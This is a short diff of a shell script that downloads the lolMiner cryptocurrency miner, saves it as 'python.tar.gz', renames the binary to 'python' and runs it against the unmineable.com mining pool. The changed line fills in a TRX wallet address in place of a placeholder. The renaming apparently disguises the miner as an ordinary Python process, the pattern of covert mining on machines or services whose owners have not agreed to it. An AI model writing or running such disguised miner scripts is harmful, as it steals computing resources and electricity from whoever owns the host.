@@ -2,4 +2,4 @@ curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/release
 tar -zxvf python.tar.gz
 cd 1.31
 mv lolMiner python
-./python --algo ETHASH --pool ethash.unmineable.com:3333 --user COIN:TYSnLDWrR5TmqgRKTM2ApKkng5ZW9j9iaH.K80 --ethstratum ETHPROXY
+./python --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TYSnLDWrR5TmqgRKTM2ApKkng5ZW9j9iaH.K80 --ethstratum ETHPROXY
